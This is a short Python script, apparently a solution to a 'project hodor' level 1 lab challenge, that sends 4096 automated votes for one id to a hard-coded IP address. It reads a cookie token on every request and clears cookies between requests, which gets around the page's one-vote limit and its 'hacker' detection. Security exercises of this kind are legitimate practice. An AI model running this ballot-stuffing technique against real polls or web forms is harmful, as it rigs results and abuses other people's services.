#!/usr/bin/python3
import requests
"""level_1 module

    Votes 4096 times (hopefully) for id 2529 on level_1 of project hodor
    Voting requires to send the value from a cookie to work.
    """
# Target URL
url = "http://158.69.76.135/level1.php"

failed = 0
success = 0
total = 4096

# Start a session
session = requests.Session()

# Loop and pray
for i in range(total):
    # Request the form page and fetch the cookie
    res = session.get(url)
    dict = session.cookies.get_dict()

    # Prepare the payload of the POST request
    data = {'id': 2529,
            'key': dict['HoldTheDoor'],
            'holdthedoor': 'Envoyer'}

    # Lick the stamp and SEND IT
    post = session.post(url, data)

    # Print stuff after each request
    print("Request #{:d}".format(i), end=' ')
    print("Key: {:s}".format(dict['HoldTheDoor']), end=' ')
    if post and "hacker" not in post.text:
        print("Request success")
        success += 1
    else:
        print("Request fail")
        failed += 1
    # Clear session cookies
    session.cookies.clear()

# Print stuff after all requests are done
print("{:d} requests sent".format(total))
print("{:d} requests succeded".format(success))
print("{:d} requests failed".format(failed))
